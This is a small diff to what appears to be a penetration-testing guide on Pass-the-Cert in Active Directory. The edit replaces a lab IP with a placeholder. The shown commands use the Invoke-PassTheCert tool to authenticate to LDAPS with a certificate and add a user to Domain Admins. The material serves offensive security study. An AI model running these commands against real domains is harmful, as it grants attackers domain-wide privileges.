@@ -55,9 +55,10 @@ It can also be done with this [Invoke-PassTheCert](https://github.com/jamarir/In
 Import-Module .\Invoke-PassTheCert.ps1
 .\Invoke-PassTheCert.ps1 -?
 # Authenticate to LDAP/S
-$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '192.168.56.202' -Port 636 -Certificate cert.pfx
+$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx
 # List all the available actions
 Invoke-PassTheCert -a -NoBanner
+
 # Perform an action, e.g. add simple_user to Domain Admins (assuming the account authenticated with the certificate is allowed to do so).
 Invoke-PassTheCert -Action 'AddGroupMember' -LdapConnection $LdapConnection -Identity 'CN=simple_user,CN=Users,DC=domain,DC=local' -GroupDN 'CN=Domain Admins,CN=Users,DC=domain,DC=local'
 ```
